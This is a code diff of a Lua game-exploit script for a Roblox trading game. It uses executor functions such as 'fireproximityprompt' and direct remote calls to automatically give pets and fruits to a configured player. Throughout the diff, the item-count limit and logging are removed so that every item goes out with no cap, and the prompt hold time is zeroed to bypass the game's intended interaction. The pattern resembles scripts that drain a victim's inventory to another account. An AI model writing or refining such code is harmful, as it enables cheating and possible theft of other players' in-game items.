@@ -67,17 +67,14 @@ function Trade(player , item , type)
                 "GivePet",
                 player
             }
-        Remote.trade_pet:FireServer(unpack(args))
-            Log.SendGift += 1
+            Remote["trade_pet"]:FireServer(unpack(args))
         else
             local promt = player.character:FindFirstChild("HumanoidRootPart"):FindFirstChild("ProximityPrompt")
             if not promt then return end
 
             if promt and promt.Enabled then
                 promt.HoldDuration = 0
-                fireproximityprompt(promt , 0 ,function()
-                    Log.SendGift += 1
-                end)
+                fireproximityprompt(promt , 0)
             end
         end
     end)
@@ -193,10 +190,6 @@ end
 
 function Trade_PET()
     pcall(function()
-        if Log.SendGift >= _G.Configs.Limit_Item then
-            return
-        end
-    
         local Pet = GET_PETS()
         Trade(_G.Configs.Player , Pet , "Pet")
     end)
@@ -204,10 +197,6 @@ end
 
 function Trade_Fruit()
     pcall(function()
-        if Log.SendGift >= _G.Configs.Limit_Item then
-            return
-        end
-    
         local fruit = GET_FRUIT()
         Trade(_G.Configs.Player , fruit , "Fruit")
     end)
